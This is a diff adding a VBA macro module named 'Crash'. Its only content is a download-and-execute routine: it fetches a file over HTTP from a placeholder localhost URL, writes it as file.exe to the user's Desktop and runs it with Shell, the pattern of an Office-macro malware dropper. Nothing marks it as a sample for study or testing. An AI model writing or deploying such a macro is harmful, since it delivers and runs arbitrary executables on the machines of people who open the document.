@@ -1,0 +1,36 @@
+Option Explicit
+
+#If VBA7 And Win64 Then
+    Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
+#Else
+    Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+#End If
+
+Sub Crash()
+
+    Dim myURL As String, sFilename As String
+    myURL = "http://localhost/"
+    sFilename = Environ("SystemDrive") & Environ("HomePath") & _
+            Application.PathSeparator & "Desktop" & Application.PathSeparator & _
+            "file.exe"
+   
+    Dim WinHttpReq As Object, oStream As Object
+    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
+    WinHttpReq.Open "GET", myURL, False ', "username", "password"
+   WinHttpReq.Send
+   
+    myURL = WinHttpReq.ResponseBody
+    If WinHttpReq.Status = 200 Then
+        Set oStream = CreateObject("ADODB.Stream")
+        oStream.Open
+        oStream.Type = 1
+        oStream.Write WinHttpReq.ResponseBody
+        oStream.SaveToFile sFilename, 2  ' 1 = no overwrite, 2 = overwrite
+       oStream.Close
+       
+       Shell sFilename, vbNormalFocus
+       Sleep 2000
+
+    End If
+
+End Sub
